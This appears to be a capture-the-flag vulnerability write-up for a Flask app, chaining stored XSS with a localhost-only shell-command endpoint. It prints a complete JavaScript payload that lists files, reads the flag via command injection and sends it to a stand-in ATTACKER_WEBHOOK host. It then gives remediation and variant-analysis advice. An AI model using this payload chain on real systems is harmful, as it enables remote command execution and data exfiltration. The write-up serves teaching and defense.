# Vulnerability Report: PumpkinSpice
---

## Context

PumpkinSpice is a Flask-based Python web application that allows users to submit delivery addresses through a web form and view a list of all registered addresses. The application runs inside a Docker container on Linux, accessible via a web browser.

The application exposes three primary routes:

- `GET /` — Renders a static index page with an address submission form.
- `POST /add/address` — Accepts a form field named `address`, appends it to a shared in-memory list, and triggers an automated bot via a background thread.
- `GET /addresses` — Renders the full list of submitted addresses. Access is restricted to requests originating from `127.0.0.1` or `::1` (localhost only).
- `GET /api/stats` — Also restricted to localhost. Accepts a `command` GET parameter and executes it via `subprocess.check_output(command, shell=True)`, returning the output.

A critical piece of functionality is `start_bot()`, which is invoked as a background thread each time a new address is submitted. This function spawns a headless Chromium browser (via Selenium) running on localhost, which navigates to the `/addresses` endpoint. This bot simulates an authenticated or privileged internal user visiting the page, and is the mechanism through which XSS payloads are executed in a localhost context.

The application receives input through:
- The `address` form field in `POST /add/address` (attacker-controlled, no sanitization)
- The `command` GET parameter in `GET /api/stats` (only reachable from localhost)

---

## Vulnerability

### Classification

- **CWE-79**: Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting)
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)

### Root Cause: Unsafe Template Rendering (XSS)

The primary vulnerability is a stored Cross-Site Scripting (XSS) flaw in the `addresses.html` Jinja2 template. User-submitted addresses are rendered using the `|safe` filter, which explicitly disables Jinja2's automatic HTML escaping:

```html
{% for address in addresses %}
<p>{{ address|safe }}</p>
{% endfor %}
```

Because there is no input validation or sanitization on the `address` field in the `POST /add/address` route, an attacker can submit a raw HTML or JavaScript payload that will be injected verbatim into the page. When the bot visits `/addresses`, it executes any JavaScript present in the page within a localhost context.

### Secondary Vulnerability: Unauthenticated Command Injection

The `/api/stats` endpoint passes a user-supplied `command` parameter directly to a shell:

```python
results = subprocess.check_output(command, shell=True, universal_newlines=True)
return results
```

There is no sanitization, escaping, or allowlisting of commands. The only protection is the localhost-only IP check. Once an attacker achieves execution in a localhost context (via XSS and the bot), this endpoint provides direct, unauthenticated OS command execution.

---

## Exploitation

### Overview

The exploit chain is two stages: stored XSS triggers JavaScript execution in the bot's localhost browser context, which is then used to invoke the command injection endpoint and exfiltrate the flag.

### Stage 1: Stored XSS via Unsanitized Address Input

The attacker submits a JavaScript payload as the `address` form field to `POST /add/address`. Because the template renders addresses with `|safe`, the script tag is injected into the page as raw HTML. When `start_bot()` triggers the headless Chromium instance to visit `/addresses`, the injected script executes with localhost origin, bypassing the IP restriction on `/api/stats`.

A basic proof-of-concept confirming XSS execution:

```html
<script>alert(0)</script>
```

### Stage 2: Command Injection and Flag Exfiltration

Since the flag filename is randomized at container startup (e.g., `/flag_a3f9c2`), the attacker's JavaScript must first enumerate the filesystem, then read the flag. The full exploit payload submitted as the address field is:

```html
<script>
(async () => {
    let response = await fetch('/api/stats?command=ls+/');
    let listing = await response.text();
    // Parse the flag filename from the directory listing
    let flagName = listing.split('flag')[1].substr(0, 10);
    response = await fetch('/api/stats?command=cat+/flag' + flagName + '.txt');
    let flag = await response.text();
    // Exfiltrate to attacker-controlled server
    await fetch('https://ATTACKER_WEBHOOK?c=' + btoa(flag));
})()
</script>
```

**Step-by-step execution:**

1. The attacker submits the payload above via `POST /add/address`.
2. The server appends the raw HTML to the `addresses` list and spawns the bot thread.
3. The bot's headless Chrome visits `http://localhost:1337/addresses` and executes the injected script.
4. The script fetches `/api/stats?command=ls+/` — the localhost origin bypasses the IP check — and receives a directory listing.
5. The script parses the randomized flag filename from the listing.
6. The script fetches `/api/stats?command=cat+/flag<suffix>.txt` to read the flag contents.
7. The flag is Base64-encoded and sent as a query parameter to the attacker's webhook server, completing the exfiltration.

### Exploit Primitives

This vulnerability chain provides:

- **Arbitrary JavaScript execution** in the context of the internal bot (localhost origin)
- **Arbitrary OS command execution** via the `/api/stats` endpoint, with output returned to the caller
- **Arbitrary file read** (via `cat`)
- **Full flag exfiltration** to an external attacker-controlled server

---

## Remediation

### 1. Remove the `|safe` Filter and Sanitize User Input

The `|safe` filter should be removed from the addresses template. Jinja2 auto-escapes HTML by default; using `|safe` overrides this and is the direct cause of the XSS:

```html
<!-- Vulnerable -->
<p>{{ address|safe }}</p>

<!-- Fixed: let Jinja2 escape HTML entities automatically -->
<p>{{ address }}</p>
```

Additionally, user-supplied input should be validated server-side. Addresses should be checked against a strict format (e.g., alphanumeric characters, commas, and spaces only) before being stored.

### 2. Remove or Restrict the Command Execution Endpoint

The `/api/stats` endpoint is fundamentally dangerous because it executes arbitrary shell commands. It should be removed entirely or replaced with a hardcoded, parameterless function that returns only the intended system statistics without accepting user input.

If the functionality is genuinely required, replace `shell=True` with a fixed command list and eliminate the user-controlled `command` parameter entirely:

```python
# Instead of: subprocess.check_output(command, shell=True)
results = subprocess.check_output(["uptime"], shell=False)
```

### 3. Isolate the Bot from Sensitive Internal Endpoints

The bot should not have unrestricted access to administrative endpoints. Internal routes like `/api/stats` should require an additional authentication token or secret header — localhost origin alone is insufficient as a security boundary once XSS is possible.

### 4. Apply Content Security Policy (CSP)

A strict Content Security Policy header can prevent injected scripts from making outbound fetch requests, limiting the attacker's ability to exfiltrate data even if XSS is achieved:

```
Content-Security-Policy: default-src 'self'; connect-src 'none';
```

### 5. Variant Analysis

To identify similar vulnerabilities in other codebases:

- Search Jinja2 templates for uses of `|safe` applied to user-controlled variables — these are high-confidence XSS candidates.
- Search Python Flask/Django code for `subprocess` calls where any parameter originates from `request.args`, `request.form`, or `request.json`.
- Audit any route that uses IP address as its sole authorization mechanism; these are vulnerable to SSRF and XSS-assisted bypass.
- Use static analysis tools such as Bandit (`bandit -r .`) to flag `subprocess` calls with `shell=True` and taint-flow analyzers to trace user input into template rendering.
